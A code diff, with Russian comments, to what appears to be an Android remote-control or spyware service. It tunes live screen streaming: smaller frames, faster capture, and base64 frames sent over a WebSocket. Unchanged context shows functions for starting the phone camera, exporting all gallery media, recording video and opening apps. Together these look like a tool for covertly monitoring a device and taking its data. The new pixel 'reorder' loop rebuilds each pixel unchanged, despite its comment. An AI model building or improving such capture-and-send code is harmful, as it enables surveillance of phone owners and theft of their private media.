@@ -41,6 +41,7 @@ import java.io.FileOutputStream;
 import java.io.PrintWriter;
 import java.net.URI;
 import java.nio.ByteBuffer;
+import java.nio.IntBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -254,7 +255,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== ИСПРАВЛЕННЫЙ СКРИНШОТ (с учётом row stride) =====================
+    // ===================== ИСПРАВЛЕННЫЙ СКРИНШОТ (через IntBuffer) =====================
     private void takeScreenshot() {
         if (sMediaProjection == null) {
             writeLog("MediaProjection не инициализирован для скриншота");
@@ -306,28 +307,26 @@ public class WebSocketService extends Service {
             bitmap.copyPixelsFromBuffer(buffer);
             return bitmap;
         } else {
+            // Используем IntBuffer для правильного порядка RGBA
             buffer.rewind();
-            int bytesPerPixel = pixelStride;
-            byte[] row = new byte[rowStride];
+            IntBuffer intBuffer = buffer.asIntBuffer();
             int[] pixels = new int[width * height];
-            for (int y = 0; y < height; y++) {
-                buffer.get(row);
-                int offset = 0;
-                for (int x = 0; x < width; x++) {
-                    int a = row[offset + 3] & 0xFF;
-                    int r = row[offset + 2] & 0xFF;
-                    int g = row[offset + 1] & 0xFF;
-                    int b = row[offset] & 0xFF;
-                    pixels[y * width + x] = (a << 24) | (r << 16) | (g << 8) | b;
-                    offset += bytesPerPixel;
-                }
+            intBuffer.get(pixels);
+            // Корректируем порядок: Android использует ARGB, а данные могут быть RGBA
+            for (int i = 0; i < pixels.length; i++) {
+                int p = pixels[i];
+                int a = (p >> 24) & 0xFF;
+                int r = (p >> 16) & 0xFF;
+                int g = (p >> 8) & 0xFF;
+                int b = p & 0xFF;
+                pixels[i] = (a << 24) | (r << 16) | (g << 8) | b;
             }
             bitmap.setPixels(pixels, 0, width, 0, 0, width, height);
             return bitmap;
         }
     }
 
-    // ===================== СТРИМИНГ (с использованием того же метода) =====================
+    // ===================== УСКОРЕННЫЙ СТРИМИНГ (разрешение 320x480, задержка 100 мс) =====================
     private void handleStream(org.json.JSONObject params) {
         if (params == null) return;
         String action = params.optString("action");
@@ -354,7 +353,7 @@ public class WebSocketService extends Service {
                     return;
                 }
                 takeScreenshotForStream();
-                handler.postDelayed(this, 200);
+                handler.postDelayed(this, 100); // 100 мс вместо 200
             }
         };
         handler.post(streamRunnable);
@@ -366,18 +365,18 @@ public class WebSocketService extends Service {
             return;
         }
         try {
-            int width = 480, height = 640;
+            int width = 320, height = 480;
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
             virtualDisplay = sMediaProjection.createVirtualDisplay("Stream", width, height, 240,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
-            Thread.sleep(100);
+            Thread.sleep(50);
             Image image = imageReader.acquireLatestImage();
             if (image != null) {
                 Bitmap bitmap = imageToBitmap(image);
                 image.close();
                 if (bitmap != null) {
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
+                    bitmap.compress(Bitmap.CompressFormat.PNG, 80, baos);
                     String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                     client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
                     writeLog("Кадр стрима отправлен");
@@ -396,7 +395,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== ВИДЕО (автоматическая отправка после записи) =====================
+    // ===================== ВИДЕО (без изменений) =====================
     private void startVideoRecording() {
         if (sMediaProjection == null) {
             writeLog("MediaProjection не инициализирован для видео");
@@ -464,7 +463,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== КАМЕРА =====================
+    // ===================== КАМЕРА (без изменений) =====================
     private void startCamera(boolean front) {
         writeLog("Запрос камеры, фронтальная: " + front);
         Intent intent = new Intent(front ? ACTION_CAMERA_FRONT : ACTION_CAMERA_BACK);
@@ -483,7 +482,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== ЭКСПОРТ ГАЛЕРЕИ =====================
+    // ===================== ЭКСПОРТ ГАЛЕРЕИ (отправка всех медиа) =====================
     private void exportGallery() {
         writeLog("Экспорт галереи запущен");
         new Thread(() -> {
@@ -550,7 +549,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== ОСТАЛЬНЫЕ ФУНКЦИИ =====================
+    // ===================== ОСТАЛЬНЫЕ ФУНКЦИИ (без изменений) =====================
     private void openApp(String pkg) {
         if (pkg == null || pkg.isEmpty()) {
             writeLog("Не указан пакет");
